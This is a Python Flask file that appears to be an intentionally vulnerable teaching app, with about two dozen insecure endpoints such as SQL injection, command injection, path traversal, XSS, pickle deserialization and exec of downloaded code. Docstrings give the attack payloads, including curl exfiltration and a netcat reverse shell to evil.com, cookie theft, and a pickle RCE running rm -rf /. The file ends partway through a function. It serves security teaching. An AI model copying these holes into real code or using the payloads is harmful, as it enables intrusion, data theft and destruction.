# app_bad.py
# ------------------------------------------------------------
# INSECURE examples (bad patterns) for "security bypass" topics
#
# Run:
#   pip install flask lxml
#   python app_bad.py
# Open: http://127.0.0.1:5000/
# ------------------------------------------------------------
from flask import Flask, request, jsonify, redirect, make_response
from pathlib import Path
import os, subprocess, sqlite3, pickle, base64, logging, urllib.request
import hashlib, hmac, time, struct
from xml.etree import ElementTree as ET  
# XXE unsafe in some parsers; stdlib is still used here for demo
# Note: Real XXE typically requires parsers that load external entities (e.g., lxml without defenses).
# We keep a simplistic "bad" parse to illustrate unsafe parsing of untrusted XML.

app = Flask(__name__)
app.secret_key = "hardcoded-secret"   # Hardcoded Password (bad)

DB = "bad.db"
Path(DB).unlink(missing_ok=True)
conn = sqlite3.connect(DB)
cur = conn.cursor()
cur.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password_hash TEXT, is_admin INTEGER)")
cur.execute("INSERT INTO users (username,password_hash,is_admin) VALUES ('alice','" + hashlib.md5(b'Password123').hexdigest() + "',1)")  # Broken crypto (MD5) + string concat
cur.execute("INSERT INTO users (username,password_hash,is_admin) VALUES ('bob','" + hashlib.sha256(b'Password123').hexdigest() + "',0)")  # Unsalted hash
conn.commit(); conn.close()

logging.basicConfig(level=logging.INFO)

def ok(data=None, status=200): return (jsonify({"ok": True, "data": data}), status)
def err(msg="error", status=400): return (jsonify({"ok": False, "error": msg}), status)


@app.route("/")
def index():
    return ok({
        "note": "INSECURE endpoints for demonstration only",
        "topics": [
            "Authentication Bypass (client flag) -> /auth/bypass",
            "Reliance on Untrusted Inputs (trust role) -> /inputs/trust",
            "Missing/Incorrect Authorization (IDOR) -> /auth/idor?id=1",
            "Missing Encryption of Sensitive Data -> /crypto/plaintext",
            "Use of a Broken Crypto Algorithm (MD5) -> /crypto/md5_login",
            "Unsalted Hash -> /crypto/unsalted",
            "Password Guessing (no rate limit) -> /auth/login",
            "Integer Overflow -> /math/overflow?x=4294967295&y=2",
            "Download of Code Without Integrity Check -> /code/download?url=...",
            "Open Redirect -> /redirect?next=http://evil.com",
            "Cross-Site Scripting -> /xss?msg=<script>alert(1)</script>",
            "Cross-Site Request Forgery (no CSRF) -> /bank/transfer (POST)",
            "Upload of Dangerous File -> /upload (POST file)",
            "XML External Entities (unsafe parse) -> /xml/parse (POST)",
            "Path Traversal -> /logs/read?file=../../etc/passwd",
            "OS Command Injection -> /sys/ping?host=8.8.8.8;cat /etc/passwd",
            "SQL Injection -> /users/find?name=' OR '1'='1",
            "Insecure Deserialization -> /pickle/load (POST)",
            "Buffer Overflow (simulated) -> /buf/pack?count=999999999999",
            "Format String Injection -> /fmt?pattern=%(user)s%(missing)s",
            "Hardcoded Password -> /admin/door?pw=Password123",
            "Verbose Error Message -> /error/debug",
            "Code Injection (eval) -> /code/eval?expr=__import__('os').system('dir')",
            "Signature Verification (skipped) -> /sig/verify (POST)",
        ]
    })


# ===================================================================================
# VULNERABILITY EXPLANATION: AUTHENTICATION BYPASS (CLIENT FLAG)
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Authentication Bypass via Client-Side Control

DESCRIPTION:
This endpoint demonstrates a critical authentication flaw where the application
trusts a client-supplied parameter ("is_admin") to determine user privileges.
This violates the fundamental security principle of "never trust user input."

🎯 ATTACK SCENARIO:
1. Attacker discovers the endpoint: /auth/bypass
2. Attacker analyzes the URL and tries: /auth/bypass?is_admin=1
3. Application immediately grants admin access without verification
4. Attacker gains unauthorized administrative privileges

EXAMPLE ATTACK:
curl "http://localhost:5000/auth/bypass?is_admin=1"
# Result: {"ok": True, "data": {"msg": "Welcome admin!"}}

💥 SECURITY IMPACT:
- CRITICAL: Complete authentication bypass
- Unauthorized administrative access
- Privilege escalation from anonymous to admin
- Potential access to sensitive administrative functions
- Violation of access control principles

🛡️ WHY THIS IS DANGEROUS:
- Authentication should be server-side verification, not client-side flags
- URL parameters can be easily manipulated by attackers
- No actual verification of user identity or permissions
- Breaks the security model entirely

📚 SECURE ALTERNATIVE:
Instead of trusting client input, implement proper server-side authentication:
1. Verify user session/token on server
2. Check user permissions from authoritative database
3. Never rely on client-supplied authorization data
4. Implement proper session management
"""
@app.get("/auth/bypass")
def auth_bypass():
    # ❌ BAD: trust a client-supplied flag
    # This is a critical security flaw - NEVER do this in real applications!
    
    # The application blindly trusts the "is_admin" parameter from the URL
    # Anyone can add ?is_admin=1 to the URL and gain admin access
    if request.args.get("is_admin") == "1":
        return ok({"msg": "Welcome admin!"})
    return err("forbidden", 403)

@app.get("/inputs/trust")
def inputs_trust():
    # ===================================================================================
    # VULNERABILITY EXPLANATION: RELIANCE ON UNTRUSTED INPUTS
    # ===================================================================================
    """
    🔍 VULNERABILITY TYPE: Reliance on Untrusted Client Input for Authorization
    
    DESCRIPTION:
    This function demonstrates another form of authentication bypass where the application
    trusts user-supplied role information to determine access levels. The 'role' parameter
    comes directly from the client and is used for authorization decisions.
    
    🎯 ATTACK SCENARIO:
    1. Normal user accesses: /inputs/trust → gets "user" panel
    2. Attacker modifies URL: /inputs/trust?role=admin → gets "admin" panel
    3. No server-side verification of the user's actual role
    4. Instant privilege escalation through URL manipulation
    
    EXAMPLE ATTACK:
    curl "http://localhost:5000/inputs/trust?role=admin"
    # Result: {"ok": True, "data": {"panel": "admin"}}
    
    💥 SECURITY IMPACT:
    - Unauthorized access to administrative functions
    - Role-based access control completely bypassed
    - No audit trail of legitimate vs illegitimate access
    - Potential data exposure through elevated privileges
    
    🛡️ WHY THIS IS DANGEROUS:
    - Client-supplied data should NEVER be trusted for security decisions
    - Role information should come from authenticated sessions
    - Authorization should be verified against authoritative sources (database)
    - URL parameters can be easily manipulated by any user
    """
    # ❌ BAD: trust 'role' from client
    # The application takes the role directly from URL parameters without any verification
    role = request.args.get("role", "user")
    if role == "admin":
        return ok({"panel": "admin"})
    return ok({"panel": "user"})


# ===================================================================================
# VULNERABILITY EXPLANATION: INSECURE DIRECT OBJECT REFERENCE (IDOR)
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Missing Authorization Check + SQL Injection

DESCRIPTION:
This endpoint demonstrates an Insecure Direct Object Reference (IDOR) vulnerability
where users can access any user's data by simply changing the 'id' parameter.
Additionally, it contains a SQL injection vulnerability through string concatenation.

🎯 ATTACK SCENARIO:
1. User accesses their own data: /auth/idor?id=1
2. Attacker changes ID: /auth/idor?id=2 → gets user 2's data
3. Attacker can enumerate all users: /auth/idor?id=3, /auth/idor?id=4, etc.
4. SQL injection: /auth/idor?id=1 UNION SELECT password_hash,username,1 FROM users--

EXAMPLE ATTACKS:
# Data enumeration
curl "http://localhost:5000/auth/idor?id=2"
# SQL injection  
curl "http://localhost:5000/auth/idor?id=1%20UNION%20SELECT%20password_hash,username,1%20FROM%20users--"

💥 SECURITY IMPACT:
- Unauthorized access to other users' personal information
- Complete user database enumeration possible
- Privacy violations and data breaches
- Potential extraction of password hashes via SQL injection
- No access control enforcement

🛡️ WHY THIS IS DANGEROUS:
- No ownership verification (users should only see their own data)
- Direct database object access without authorization
- String concatenation allows SQL injection attacks
- Predictable ID parameters make enumeration easy
- No logging of unauthorized access attempts
"""
@app.get("/auth/idor")
def idor():
    # ❌ BAD: no ownership check
    user_id = request.args.get("id", "1")
    conn = sqlite3.connect(DB)
    cur = conn.cursor()
    # ❌ DOUBLE BAD: SQL injection via string formatting + no authorization check
    row = cur.execute(f"SELECT id,username,is_admin FROM users WHERE id={user_id}").fetchone()  # concat
    conn.close()
    if not row: return err("not_found", 404)
    return ok({"id": row[0], "username": row[1], "is_admin": row[2]})


# ===================================================================================
# VULNERABILITY EXPLANATION: MISSING ENCRYPTION OF SENSITIVE DATA
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Transmission of Sensitive Data in Plaintext

DESCRIPTION:
This endpoint exposes highly sensitive personal information (Social Security Number)
in plaintext through HTTP responses. Sensitive data should always be encrypted
both in transit and at rest.

🎯 ATTACK SCENARIO:
1. Application sends SSN in HTTP response body as plaintext
2. Network traffic interception (packet sniffing, MITM attacks)
3. Server logs may contain sensitive data in plaintext
4. Browser history/cache may store sensitive information
5. Compliance violations (PCI DSS, GDPR, HIPAA)

EXAMPLE ATTACK:
# Network interception reveals:
curl "http://localhost:5000/crypto/plaintext"
# Response: "user_ssn=123-45-6789" (plaintext)

💥 SECURITY IMPACT:
- Identity theft through SSN exposure
- Privacy law violations (GDPR, CCPA, HIPAA)
- Regulatory fines and legal liability
- Loss of customer trust and reputation damage
- Potential for additional attacks using exposed data

🛡️ WHY THIS IS DANGEROUS:
- SSNs are permanent identifiers that cannot be changed
- Network traffic can be intercepted at multiple points
- Plaintext data in logs creates additional exposure
- No encryption means data is readable to anyone who accesses it
- Violates data protection principles and compliance requirements
"""
@app.get("/crypto/plaintext")
def crypto_plaintext():
    # ❌ BAD: transmit secret in plaintext (simulation)
    # This exposes highly sensitive PII without any protection
    secret = "user_ssn=123-45-6789"
    resp = make_response(secret, 200)  # no TLS here, just a string
    return resp


# ===================================================================================
# VULNERABILITY EXPLANATION: MULTIPLE AUTHENTICATION WEAKNESSES
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Broken Cryptography + SQL Injection + No Rate Limiting

DESCRIPTION:
This login function contains multiple critical security flaws:
1. Uses broken MD5 hash algorithm
2. Uses unsalted SHA-256 hashes
3. SQL injection via string formatting
4. No rate limiting allowing brute force attacks

🎯 ATTACK SCENARIO:
1. Password cracking: Attacker gets database dump and cracks MD5 hashes with rainbow tables
2. SQL injection: Username: admin'-- bypasses password check entirely
3. Brute force: Unlimited login attempts to guess passwords
4. Dictionary attacks: Unsalted hashes vulnerable to precomputed attacks

EXAMPLE ATTACKS:
# SQL injection login bypass
curl -X POST http://localhost:5000/auth/login -d "username=admin'--&password=anything"

# Brute force (no rate limiting)
for i in {1..1000}; do
  curl -X POST http://localhost:5000/auth/login -d "username=alice&password=pass$i"
done

💥 SECURITY IMPACT:
- Account takeover through multiple attack vectors
- Complete authentication system bypass
- Password database compromise
- Automated attacks without detection
- User credential exposure

🛡️ WHY THIS IS DANGEROUS:
- MD5 is cryptographically broken (rainbow table attacks)
- No salt means identical passwords have identical hashes
- String formatting enables SQL injection
- No rate limiting enables automated attacks
- Multiple vulnerabilities compound the risk
"""
@app.post("/auth/login")
def auth_login():
    # ❌ BAD: md5/sha256 of password without salt, no rate limit
    username = request.form.get("username", "")
    password = request.form.get("password", "").encode()
    # ❌ BAD: Using broken cryptographic algorithms
    pw_md5 = hashlib.md5(password).hexdigest()  # MD5 is broken!
    pw_sha = hashlib.sha256(password).hexdigest()  # No salt!
    conn = sqlite3.connect(DB)
    cur = conn.cursor()
    # ❌ BAD: SQL injection via string formatting
    row = cur.execute("SELECT id,username,password_hash,is_admin FROM users WHERE username='%s'" % username).fetchone()  # SQLi risk
    conn.close()
    if not row: return err("invalid", 401)
    # ❌ BAD: No rate limiting - allows unlimited brute force attempts
    if row[2] in (pw_md5, pw_sha):
        return ok({"msg": "logged in (insecure)"})
    return err("invalid", 401)


# ===================================================================================
# VULNERABILITY EXPLANATION: EXPLICIT USE OF BROKEN MD5 ALGORITHM
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Use of Cryptographically Broken Hash Algorithm

DESCRIPTION:
This endpoint explicitly demonstrates the use of MD5 for password hashing.
MD5 is cryptographically broken and should never be used for security purposes,
especially password hashing.

🎯 ATTACK SCENARIO:
1. Attacker obtains MD5 hash from this endpoint
2. Uses online MD5 rainbow tables to reverse the hash
3. Common passwords can be cracked in seconds
4. MD5 collisions can be generated to create fake credentials

EXAMPLE ATTACK:
# Generate MD5 hash
curl -X POST http://localhost:5000/crypto/md5_login -d "username=test&password=password123"
# Returns: MD5 hash that can be cracked with rainbow tables

💥 SECURITY IMPACT:
- Immediate password recovery for common passwords
- MD5 collisions allow credential forgery
- No computational cost for attackers
- Rainbow table attacks are instantaneous

🛡️ WHY MD5 IS BROKEN:
- Designed for speed, not security
- Cryptographic collisions can be generated easily
- Rainbow tables exist for common passwords
- No salt makes attacks even easier
- Considered broken since 2004
"""
@app.post("/crypto/md5_login")
def crypto_md5_login():
    # ❌ BAD: explicitly MD5 for password verification
    username = request.form.get("username", "")
    password = request.form.get("password", "").encode()
    # ❌ CRITICAL: MD5 is cryptographically broken!
    digest = hashlib.md5(password).hexdigest()
    return ok({"note": "never use MD5 for passwords", "username": username, "hash": digest})


# ===================================================================================
# VULNERABILITY EXPLANATION: UNSALTED PASSWORD HASHING
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Unsalted Password Hashing

DESCRIPTION:
This endpoint uses SHA-256 without salt, making it vulnerable to rainbow table
attacks and identical password detection. Even strong hash algorithms are weak
without proper salting.

🎯 ATTACK SCENARIO:
1. Attacker obtains unsalted SHA-256 hashes
2. Uses precomputed rainbow tables for common passwords
3. Identifies users with identical passwords (same hash)
4. Dictionary attacks against the hash database

EXAMPLE ATTACK:
# Two users with same password will have identical hashes
curl -X POST http://localhost:5000/crypto/unsalted -d "password=password123"
curl -X POST http://localhost:5000/crypto/unsalted -d "password=password123"
# Both return identical SHA-256 hashes, revealing password reuse

💥 SECURITY IMPACT:
- Rainbow table attacks succeed against common passwords
- Identical passwords easily identified
- Password patterns become visible
- Mass password cracking possible

🛡️ WHY SALT IS ESSENTIAL:
- Makes rainbow tables ineffective
- Ensures unique hashes for identical passwords
- Increases computational cost for attackers
- Required by security standards (OWASP, NIST)
"""
@app.post("/crypto/unsalted")
def crypto_unsalted():
    # ❌ BAD: unsalted SHA-256
    password = request.form.get("password", "").encode()
    # ❌ BAD: No salt means identical passwords have identical hashes
    return ok({"hash": hashlib.sha256(password).hexdigest()})


# ===================================================================================
# VULNERABILITY EXPLANATION: INTEGER OVERFLOW
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Integer Overflow Leading to Unexpected Behavior

DESCRIPTION:
This endpoint simulates integer overflow by performing arithmetic operations
and wrapping the result to 32-bit boundaries. This can lead to unexpected
behavior and security issues in applications that rely on integer calculations.

🎯 ATTACK SCENARIO:
1. Attacker provides large numbers that cause overflow
2. Application wraps around to unexpected values
3. Security checks based on integer values can be bypassed
4. Financial calculations can be manipulated

EXAMPLE ATTACK:
# Integer overflow attack
curl "http://localhost:5000/math/overflow?x=4294967295&y=2"
# Result: wraps to 1 instead of 4294967297

💥 SECURITY IMPACT:
- Bypass of security checks based on integer values
- Financial fraud through calculation manipulation
- Buffer overflow potential if used for memory allocation
- Denial of service through unexpected program behavior
- Logic errors in security-critical calculations

🛡️ WHY THIS IS DANGEROUS:
- Silent failures - no error indication
- Unexpected results can break security assumptions
- Can bypass bounds checking and validation
- May lead to memory corruption in some languages
- Creates inconsistent application state
"""
@app.get("/math/overflow")
def int_overflow():
    x = int(request.args.get("x", "0"))
    y = int(request.args.get("y", "0"))
    # ❌ BAD: assume 32-bit and wrap silently
    # This can cause unexpected behavior and security issues
    res = (x + y) & 0xFFFFFFFF  # Wraps around at 32-bit boundary
    return ok({"sum_32bit_wrapped": res})


# ===================================================================================
# VULNERABILITY EXPLANATION: CODE DOWNLOAD WITHOUT INTEGRITY CHECK
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Remote Code Execution via Untrusted Code Download

DESCRIPTION:
This endpoint downloads and executes code from a user-supplied URL without any
integrity verification. This is extremely dangerous as it allows arbitrary
code execution on the server.

🎯 ATTACK SCENARIO:
1. Attacker hosts malicious Python code on their server
2. Attacker calls: /code/download?url=http://evil.com/malware.py
3. Application downloads and executes the malicious code
4. Attacker gains complete control of the server

EXAMPLE ATTACK:
# Malicious payload on attacker's server (malware.py):
import os; os.system('rm -rf /')  # Delete all files!

# Attack request:
curl "http://localhost:5000/code/download?url=http://evil.com/malware.py"

💥 SECURITY IMPACT:
- CRITICAL: Complete server compromise
- Arbitrary code execution with application privileges
- Data theft and destruction
- Server can be used for further attacks
- Complete loss of confidentiality, integrity, and availability

🛡️ WHY THIS IS EXTREMELY DANGEROUS:
- No verification of code source or integrity
- Executes arbitrary code with full application permissions
- No sandboxing or isolation
- URL can point to any malicious content
- Direct path to Remote Code Execution (RCE)
"""
@app.get("/code/download")
def code_download():
    url = request.args.get("url", "https://example.com/bad.py")
    # ❌ EXTREMELY DANGEROUS: download and execute without verifying integrity
    code = urllib.request.urlopen(url, timeout=5).read().decode("utf-8")
    exec(code, {})  # ❌ CRITICAL: Executes arbitrary code!
    return ok({"executed_from": url})


# ===================================================================================
# VULNERABILITY EXPLANATION: OPEN REDIRECT
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Unvalidated Redirect and Forward

DESCRIPTION:
This endpoint redirects users to any URL specified in the 'next' parameter
without validation. This allows attackers to redirect users to malicious sites
while making it appear the redirect comes from a trusted source.

🎯 ATTACK SCENARIO:
1. Attacker crafts malicious link: /redirect?next=http://evil.com/phishing
2. User clicks link thinking it's from trusted site
3. User is redirected to attacker's malicious website
4. Attacker can steal credentials or serve malware

EXAMPLE ATTACK:
# Phishing attack
curl "http://localhost:5000/redirect?next=http://evil.com/fake-login"
# User is redirected to fake login page that steals credentials

💥 SECURITY IMPACT:
- Phishing attacks using trusted domain reputation
- Malware distribution through trusted redirects
- Credential theft through fake login pages
- Reputation damage to legitimate organization
- Can bypass URL filtering and security controls

🛡️ WHY THIS IS DANGEROUS:
- Users trust the source domain in the URL
- No validation of redirect destination
- Can redirect to any arbitrary URL
- Bypasses user security awareness about suspicious domains
- Often used in sophisticated phishing campaigns
"""
@app.get("/redirect")
def open_redirect():
    nxt = request.args.get("next", "/")
    # ❌ BAD: no validation - redirects to any URL
    return redirect(nxt)  # Dangerous: allows redirect to evil.com!


# ===================================================================================
# VULNERABILITY EXPLANATION: CROSS-SITE SCRIPTING (XSS)
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Reflected Cross-Site Scripting (XSS)

DESCRIPTION:
This endpoint reflects user input directly into HTML output without proper
encoding or sanitization. This allows attackers to inject malicious JavaScript
that executes in victims' browsers.

🎯 ATTACK SCENARIO:
1. Attacker crafts malicious URL: /xss?msg=<script>alert('XSS')</script>
2. Victim clicks the link or visits the URL
3. Malicious script executes in victim's browser
4. Attacker can steal cookies, session tokens, or perform actions as the victim

EXAMPLE ATTACK:
# Basic XSS payload
curl "http://localhost:5000/xss?msg=<script>alert('XSS')</script>"

# Advanced payload to steal cookies
curl "http://localhost:5000/xss?msg=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"

💥 SECURITY IMPACT:
- Session hijacking through cookie theft
- Credential theft via fake login forms
- Defacement of website content
- Redirection to malicious sites
- Keylogging and data theft
- Propagation of XSS attacks to other users

🛡️ WHY THIS IS DANGEROUS:
- Executes in victim's browser with full DOM access
- Can access session cookies and tokens
- Bypasses Same-Origin Policy restrictions
- Difficult for users to detect
- Can be used to attack other users of the application
"""
@app.get("/xss")
def xss():
    msg = request.args.get("msg", "hello")
    # ❌ BAD: reflect unescaped content directly into HTML
    # This allows script injection and execution in browsers
    return f"<h1>{msg}</h1>"  # Direct injection point!


# ===================================================================================
# VULNERABILITY EXPLANATION: CROSS-SITE REQUEST FORGERY (CSRF)
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Cross-Site Request Forgery (CSRF)

DESCRIPTION:
This endpoint performs state-changing operations (bank transfer) without CSRF
protection. This allows attackers to trick authenticated users into performing
unwanted actions on the application.

🎯 ATTACK SCENARIO:
1. User logs into banking application (establishes session)
2. User visits attacker's malicious website while still logged in
3. Malicious site contains hidden form that submits to /bank/transfer
4. Browser automatically includes authentication cookies
5. Unauthorized transfer is executed using victim's credentials

EXAMPLE ATTACK:
# Malicious HTML on attacker's site:
<form action="http://localhost:5000/bank/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>

💥 SECURITY IMPACT:
- Unauthorized financial transactions
- Account settings changes without user consent
- Data modification or deletion
- Privilege escalation attacks
- Administrative actions performed by non-admins

🛡️ WHY THIS IS DANGEROUS:
- Leverages user's existing authentication
- Difficult for users to detect
- Can be triggered by simply visiting a webpage
- Browser automatically includes cookies
- No way to distinguish legitimate from forged requests
"""
@app.post("/bank/transfer")
def bank_transfer():
    # ❌ BAD: no CSRF defense (cookie-based session assumed)
    # This allows attackers to forge requests from authenticated users
    to = request.form.get("to", "acctX")
    amt = request.form.get("amount", "0")
    # No verification that request came from legitimate source!
    return ok({"transferred": amt, "to": to})


# ===================================================================================
# VULNERABILITY EXPLANATION: DANGEROUS FILE UPLOAD
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Unrestricted File Upload with Path Traversal

DESCRIPTION:
This endpoint accepts any file type without validation and saves files using
user-supplied filenames. This creates multiple attack vectors including
malicious code execution and path traversal attacks.

🎯 ATTACK SCENARIO:
1. Code Execution: Upload malicious.php or shell.jsp → execute server-side code
2. Path Traversal: filename="../../config.py" → overwrite critical files
3. DoS Attack: Upload massive files → exhaust disk space
4. Malware Distribution: Upload malware → infect other users

EXAMPLE ATTACKS:
# Path traversal attack
curl -X POST -F "file=@malicious.txt;filename=../../../etc/passwd" http://localhost:5000/upload

# Web shell upload  
curl -X POST -F "file=@shell.php" http://localhost:5000/upload

💥 SECURITY IMPACT:
- Remote code execution on server
- System file overwriting/corruption
- Denial of service through disk space exhaustion
- Malware distribution to users
- Data exfiltration through uploaded scripts

🛡️ WHY THIS IS DANGEROUS:
- No file type validation (allows executables)
- No size limits (DoS potential)
- User-controlled filename enables path traversal
- No content scanning for malicious code
- Files may be accessible via web for execution
"""
UPLOAD_DIR = Path("./uploads_bad"); UPLOAD_DIR.mkdir(exist_ok=True)
@app.post("/upload")
def upload():
    # ❌ BAD: no extension/size/content checks; saves with user-supplied name
    f = request.files.get("file")
    if not f: return err("no_file", 400)
    # ❌ CRITICAL: Path traversal vulnerability with user-controlled filename
    dst = UPLOAD_DIR / f.filename  # path traversal possible with ".."
    f.save(dst)  # No validation of file type, size, or content!
    return ok({"saved": str(dst)})


# ===================================================================================
# VULNERABILITY EXPLANATION: XML EXTERNAL ENTITY (XXE) INJECTION
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: XML External Entity (XXE) Injection

DESCRIPTION:
This endpoint parses untrusted XML without disabling external entity processing.
While Python's ET is relatively safe, this demonstrates the concept of XXE
attacks that are critical in other XML parsers.

🎯 ATTACK SCENARIO:
1. Attacker crafts malicious XML with external entity definitions
2. XML parser processes external entities
3. Attacker can read local files, perform SSRF, or cause DoS

EXAMPLE ATTACK (if using vulnerable parser):
# Malicious XML payload:
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

# SSRF attack:
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://internal-server/secret">]>
<root>&xxe;</root>

💥 SECURITY IMPACT:
- Local file disclosure (reading sensitive files)
- Server-Side Request Forgery (SSRF)
- Denial of Service through billion laughs attack
- Remote code execution in some configurations
- Network scanning of internal systems

🛡️ WHY XXE IS DANGEROUS:
- Can access files outside application scope
- Bypasses network security controls via SSRF
- Difficult to detect in application logs
- Can lead to full system compromise
- Often overlooked in security testing
"""
@app.post("/xml/parse")
def xml_parse():
    # ❌ BAD: parse untrusted XML directly; external entities may be abused with some parsers
    xml = request.data or b"<root/>"
    try:
        # Standard library ET is safer, but concept demonstrates XXE risk
        root = ET.fromstring(xml)  # In other parsers, this could be dangerous
        return ok({"tag": root.tag, "text": (root.text or "")})
    except Exception as e:
        return err(str(e), 400)


# ===================================================================================
# VULNERABILITY EXPLANATION: PATH TRAVERSAL (DIRECTORY TRAVERSAL)
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Path Traversal / Directory Traversal

DESCRIPTION:
This endpoint constructs file paths using user input without proper validation.
This allows attackers to access files outside the intended directory using
path traversal sequences like "../".

🎯 ATTACK SCENARIO:
1. Normal request: /logs/read?file=app.log → reads intended log file
2. Traversal attack: /logs/read?file=../../etc/passwd → reads system files
3. Configuration theft: /logs/read?file=../../../config/database.yml
4. Source code disclosure: /logs/read?file=../../../../app.py

EXAMPLE ATTACKS:
# Read system password file
curl "http://localhost:5000/logs/read?file=../../etc/passwd"

# Access application source code
curl "http://localhost:5000/logs/read?file=../app_bad.py"

# Read SSH keys
curl "http://localhost:5000/logs/read?file=../../home/user/.ssh/id_rsa"

💥 SECURITY IMPACT:
- Disclosure of sensitive system files
- Application source code exposure
- Configuration file theft (database credentials)
- SSH key and certificate theft
- Understanding of system architecture for further attacks

🛡️ WHY THIS IS DANGEROUS:
- Can access any file readable by the application
- Bypasses intended access controls
- Reveals system configuration and secrets
- Often leads to privilege escalation
- Simple attack with high impact
"""
LOG_DIR = Path("./logs_bad"); LOG_DIR.mkdir(exist_ok=True)
(LOG_DIR / "app.log").write_text("demo\n", encoding="utf-8")

@app.get("/logs/read")
def logs_read():
    filename = request.args.get("file", "app.log")
    # ❌ BAD: naive join + weak check - allows path traversal
    path = os.path.join(LOG_DIR, filename)  # "../" sequences not blocked!
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return ok({"content": fh.read()})  # Reads ANY accessible file!
    except Exception as e:
        return err(str(e), 400)


# ===================================================================================
# VULNERABILITY EXPLANATION: OS COMMAND INJECTION
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Operating System Command Injection

DESCRIPTION:
This endpoint constructs shell commands using unsanitized user input, allowing
attackers to inject arbitrary OS commands that execute on the server with
application privileges.

🎯 ATTACK SCENARIO:
1. Normal use: /sys/ping?host=8.8.8.8 → pings Google DNS
2. Command injection: /sys/ping?host=8.8.8.8;cat /etc/passwd → reveals system users
3. Data exfiltration: /sys/ping?host=8.8.8.8;curl evil.com --data "$(cat database.txt)"
4. Reverse shell: /sys/ping?host=8.8.8.8;nc evil.com 4444 -e /bin/bash

EXAMPLE ATTACKS:
# Basic command injection
curl "http://localhost:5000/sys/ping?host=8.8.8.8;whoami"

# File system access
curl "http://localhost:5000/sys/ping?host=localhost;ls -la /"

# Network exfiltration
curl "http://localhost:5000/sys/ping?host=127.0.0.1;curl evil.com --data \$(cat /etc/passwd)"

💥 SECURITY IMPACT:
- CRITICAL: Complete system compromise
- Arbitrary command execution as application user
- Data theft and system reconnaissance
- Potential privilege escalation
- Server can be used as attack platform

🛡️ WHY THIS IS EXTREMELY DANGEROUS:
- Direct OS command execution with app privileges
- Can access any file readable by application
- Potential for lateral movement in network
- Very difficult to detect without proper monitoring
- Often leads to complete system takeover
"""
@app.get("/sys/ping")
def sys_ping():
    host = request.args.get("host", "127.0.0.1")
    # ❌ EXTREMELY DANGEROUS: shell=True and user input concatenation
    cmd = f"ping -c 1 {host}"  # User input directly in shell command!
    out = subprocess.getoutput(cmd)  # Executes in shell - allows command injection!
    return ok({"cmd": cmd, "out": out})


# ===================================================================================
# VULNERABILITY EXPLANATION: SQL INJECTION
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: SQL Injection via String Formatting

DESCRIPTION:
This endpoint constructs SQL queries by directly concatenating user input into
the query string. This allows attackers to inject malicious SQL code that
modifies the query logic and potentially compromises the entire database.

🎯 ATTACK SCENARIO:
1. Normal search: /users/find?name=alice → finds users with "alice" in name
2. Boolean injection: /users/find?name=' OR '1'='1 → returns all users
3. Union injection: /users/find?name=' UNION SELECT password_hash,username,1 FROM users--
4. Database dump: Extract all sensitive data from any table

EXAMPLE ATTACKS:
# Return all users
curl "http://localhost:5000/users/find?name=' OR '1'='1"

# Extract password hashes
curl "http://localhost:5000/users/find?name=' UNION SELECT password_hash,username,is_admin FROM users--"

# Database schema discovery
curl "http://localhost:5000/users/find?name=' UNION SELECT name,sql,1 FROM sqlite_master WHERE type='table'--"

💥 SECURITY IMPACT:
- Complete database compromise
- Extraction of all user credentials and personal data
- Administrative account takeover
- Data modification or deletion
- Potential for lateral movement to other systems

🛡️ WHY THIS IS EXTREMELY DANGEROUS:
- Direct access to database without authentication
- Can extract any data from any table
- Bypasses all application-level security controls
- Often leads to complete system compromise
- Difficult to detect without proper monitoring
- Can be automated for mass data extraction
"""
@app.get("/users/find")
def users_find():
    name = request.args.get("name", "")
    conn = sqlite3.connect(DB)
    cur = conn.cursor()
    # ❌ CRITICAL: string formatting allows SQL injection
    q = f"SELECT id,username,is_admin FROM users WHERE username LIKE '%{name}%'"
    rows = cur.execute(q).fetchall()  # Executes attacker-controlled SQL!
    conn.close()
    return ok({"query": q, "rows": rows})


# ===================================================================================
# VULNERABILITY EXPLANATION: INSECURE DESERIALIZATION
# ===================================================================================
"""
🔍 VULNERABILITY TYPE: Insecure Deserialization Leading to Remote Code Execution

DESCRIPTION:
This endpoint deserializes untrusted data using Python's pickle module without
validation. Pickle can execute arbitrary code during deserialization, making
this extremely dangerous when processing untrusted input.

🎯 ATTACK SCENARIO:
1. Attacker crafts malicious pickled object containing executable code
2. Sends crafted payload to /pickle/load endpoint
3. pickle.loads() automatically executes the malicious code
4. Attacker gains remote code execution on the server

EXAMPLE ATTACK:
# Create malicious pickle payload (Python):
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))  # Deletes all files!

malicious_data = pickle.dumps(RCE())
# Send to vulnerable endpoint

💥 SECURITY IMPACT:
- CRITICAL: Immediate remote code execution
- Complete server compromise
- Data theft, destruction, or ransomware
- Server becomes part of botnet
- Lateral movement to other systems
- No authentication required for attack

🛡️ WHY PICKLE IS EXTREMELY DANGEROUS:
- Designed for trusted data only - never for user input
- Executes arbitrary code during deserialization
- No way to safely deserialize untrusted pickle data
- Attack payload can be very small and hard to detect
- Bypasses all application security controls
- Equivalent to eval() for serialized data
"""
@app.post("/pickle/load")
def pickle_load():
    data = request.data or b""
    # ❌ EXTREMELY DANGEROUS: arbitrary code execution possible
    # pickle.loads() will execute any code embedded in the serialized data
